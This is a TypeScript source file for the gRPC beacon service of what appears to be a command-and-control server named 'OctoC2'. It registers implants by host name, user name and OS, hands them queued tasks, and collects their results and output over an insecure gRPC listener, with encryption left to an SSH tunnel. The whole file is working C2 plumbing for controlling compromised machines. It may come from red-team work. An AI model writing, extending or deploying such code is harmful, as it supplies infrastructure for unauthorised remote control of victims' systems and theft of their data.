/**
 * OctoC2 Server — BeaconGrpcService
 *
 * gRPC server implementation of BeaconService.
 * Delegates all state management to BeaconRegistry and TaskQueue.
 *
 * Task delivery via gRPC is plaintext — the SSH tunnel encrypts the channel.
 * (Unlike IssuesChannel, which uses libsodium sealed box per task.)
 *
 * Environment variables read by index.ts (not this file):
 *   OCTOC2_GRPC_PORT     — TCP port to listen on (default: 50051)
 *   OCTOC2_GRPC_DISABLED — Any non-empty value: skip starting gRPC listener
 */

import * as grpc        from "@grpc/grpc-js";
import * as protoLoader from "@grpc/proto-loader";
import { tmpdir }       from "node:os";
import { join }         from "node:path";
import { writeFile, unlink } from "node:fs/promises";
import { PROTO_DEFINITION }  from "./proto-def.ts";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import type { TaskQueue }      from "../TaskQueue.ts";

// ── Internal proto request/response types (keepCase:false → camelCase) ────────

interface CheckinRequest {
  beaconId:  string;
  publicKey: string;
  hostname:  string;
  username:  string;
  os:        string;
  arch:      string;
  pid:       number;
  checkinAt: string;
}

interface ProtoTask {
  id:       string;
  kind:     string;
  argsJson: string;
  issuedAt: string;
}

interface CheckinResponse {
  pendingTasks: ProtoTask[];
}

interface SubmitResultRequest {
  result: {
    taskId:      string;
    beaconId:    string;
    success:     boolean;
    output:      string;
    data:        string;
    completedAt: string;
    signature:   string;
  };
}

interface SubmitResultResponse {
  accepted: boolean;
  message:  string;
}

// ── BeaconGrpcService ─────────────────────────────────────────────────────────

export class BeaconGrpcService {
  private readonly registry: BeaconRegistry;
  private readonly queue:    TaskQueue;
  private server: grpc.Server | null = null;

  constructor(registry: BeaconRegistry, queue: TaskQueue) {
    this.registry = registry;
    this.queue    = queue;
  }

  // ── RPC handlers ─────────────────────────────────────────────────────────────

  /**
   * Beacon calls this each sleep cycle to register/update itself and pick up tasks.
   *
   * 1. Register or update beacon in registry (preserving issueNumber from IssuesChannel).
   * 2. Retrieve all pending tasks from TaskQueue.
   * 3. Mark each pending task as delivered.
   * 4. Return tasks in the response (plaintext — SSH provides encryption).
   */
  checkin = (
    call: grpc.ServerUnaryCall<CheckinRequest, CheckinResponse>,
    callback: grpc.sendUnaryData<CheckinResponse>
  ): void => {
    try {
      const req = call.request;

      // Preserve issueNumber if already registered via IssuesChannel
      const existing    = this.registry.get(req.beaconId);
      const issueNumber = existing?.issueNumber ?? 0;

      this.registry.register({
        beaconId:    req.beaconId,
        issueNumber,
        publicKey:   req.publicKey,
        hostname:    req.hostname,
        username:    req.username,
        os:          req.os,
        arch:        req.arch,
        seq:         (existing?.lastSeq ?? 0) + 1,
        tentacleId:  4,
      });

      // Retrieve and deliver pending tasks
      const pending = this.queue.getPendingTasks(req.beaconId);
      const tasks: ProtoTask[] = pending.map((t) => {
        this.queue.markDelivered(t.taskId);
        return {
          id:       t.taskId,
          kind:     t.kind,
          argsJson: JSON.stringify(t.args),
          issuedAt: t.createdAt,
        };
      });

      console.log(
        `[gRPC] Checkin: beacon ${req.beaconId} (${req.hostname}) → ${tasks.length} task(s)`
      );

      callback(null, { pendingTasks: tasks });
    } catch (err) {
      console.error("[gRPC] Checkin error:", (err as Error).message);
      callback({
        code:    grpc.status.INTERNAL,
        message: (err as Error).message,
      } as grpc.ServiceError);
    }
  };

  /**
   * Beacon submits a completed task result.
   *
   * Finds the task by ID and calls markCompleted(). Returns accepted:false
   * for unknown task IDs (idempotent — already-completed tasks are also rejected).
   */
  submitResult = (
    call: grpc.ServerUnaryCall<SubmitResultRequest, SubmitResultResponse>,
    callback: grpc.sendUnaryData<SubmitResultResponse>
  ): void => {
    try {
      const result = call.request.result;

      if (!result) {
        callback(null, { accepted: false, message: "missing result field" });
        return;
      }

      const payload = JSON.stringify({
        success:   result.success,
        output:    result.output,
        data:      result.data      || undefined,
        signature: result.signature || undefined,
      });

      const ok = this.queue.markCompleted(result.taskId, payload);

      if (ok) {
        console.log(`[gRPC] SubmitResult: task ${result.taskId} completed (success=${result.success})`);
        callback(null, { accepted: true, message: "ok" });
      } else {
        // Task not found or already in terminal state
        callback(null, { accepted: false, message: "task not found or already completed" });
      }
    } catch (err) {
      console.error("[gRPC] SubmitResult error:", (err as Error).message);
      callback({
        code:    grpc.status.INTERNAL,
        message: (err as Error).message,
      } as grpc.ServiceError);
    }
  };

  // ── Lifecycle ─────────────────────────────────────────────────────────────────

  /** Load proto, create gRPC Server, bind to port. Resolves when listening. */
  async start(port: number, host = "0.0.0.0"): Promise<void> {
    const packageDef = await this.loadProto();
    const proto = grpc.loadPackageDefinition(packageDef) as Record<string, unknown>;
    const pkg   = proto["svc"] as Record<string, unknown>;
    const BeaconServiceDef = pkg["BeaconService"] as grpc.ServiceClientConstructor & {
      service: grpc.ServiceDefinition;
    };

    this.server = new grpc.Server();
    this.server.addService(BeaconServiceDef.service, {
      checkin:      this.checkin,
      submitResult: this.submitResult,
    });

    return new Promise((resolve, reject) => {
      this.server!.bindAsync(
        `${host}:${port}`,
        grpc.ServerCredentials.createInsecure(),
        (err, boundPort) => {
          if (err) {
            reject(err);
            return;
          }
          console.log(`[gRPC] BeaconService listening on port ${boundPort}`);
          resolve();
        }
      );
    });
  }

  /** Graceful shutdown — waits for in-flight calls to complete. */
  stop(): Promise<void> {
    if (!this.server) return Promise.resolve();
    return new Promise((resolve) => {
      this.server!.tryShutdown((err) => {
        if (err) {
          this.server!.forceShutdown();
        }
        this.server = null;
        resolve();
      });
    });
  }

  // ── Private helpers ───────────────────────────────────────────────────────────

  private async loadProto(): Promise<protoLoader.PackageDefinition> {
    const tmpFile = join(tmpdir(), `svc-server-${process.pid}.proto`);
    await writeFile(tmpFile, PROTO_DEFINITION, "utf8");
    try {
      return await protoLoader.load(tmpFile, {
        keepCase: false,
        longs:    String,
        enums:    String,
        defaults: true,
        oneofs:   true,
      });
    } finally {
      try { await unlink(tmpFile); } catch { /* best-effort */ }
    }
  }
}
